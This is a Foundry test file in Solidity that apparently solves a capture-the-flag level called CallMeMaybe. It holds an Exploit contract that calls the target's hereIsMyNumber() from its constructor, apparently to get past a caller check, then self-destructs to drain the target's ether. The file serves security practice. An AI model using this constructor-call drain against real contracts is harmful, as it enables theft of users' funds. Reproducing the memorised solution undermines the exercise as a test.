// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/CallMeMaybe.sol";

// forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;

    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        (new Exploit){value: 0.01 ether}(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }


}
contract Exploit {
    constructor(CallMeMaybe _target) payable {
        _target.hereIsMyNumber();
        selfdestruct(payable(tx.origin));
    }
}